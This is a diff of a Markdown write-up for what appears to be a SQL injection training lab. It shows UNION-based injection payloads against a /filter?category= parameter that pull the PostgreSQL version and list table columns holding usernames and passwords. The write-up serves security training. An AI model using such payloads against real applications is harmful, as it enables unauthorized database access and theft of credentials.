@@ -134,7 +134,7 @@ Extracted PostgreSQL version information to confirm database type and plan enume
 
 **Attack Payload:**
 ```http
-GET /filter?category=Accessories'+UNION+SELECT+version(),NULL-- HTTP/1.1
+GET /filter?category=Accessories'+UNION+SELECT+version(),+NULL-- HTTP/1.1
 ```
 <img width="1920" height="982" alt="LAB1_SS6" src="https://github.com/user-attachments/assets/66609ed9-dab6-4514-8deb-555673042216" />
 
@@ -203,6 +203,7 @@ GET /filter?category=Accessories'+UNION+SELECT+column_name,NULL+FROM+information
 
 *Column enumeration - username_jhatqo column identified (highlighted in response)*
 
+Searched response for "username"
 **SQL Query Executed:**
 ```sql
 SELECT * FROM products WHERE category = 'Accessories' 
@@ -211,12 +212,11 @@ UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name=
 
 **Columns Discovered:**
 
-Searched response for "username":
 <img width="1920" height="982" alt="LAB1_ss8 1" src="https://github.com/user-attachments/assets/94806c1c-6feb-45fe-a4db-eb3d27dc642d" />
 
 *Password column identified - password_flmkni (highlighted in response)*
 
-Searched response for "password":
+Searched response for "password"
 
 **Column Names:**
 - `username_jhatqo` - Stores usernames
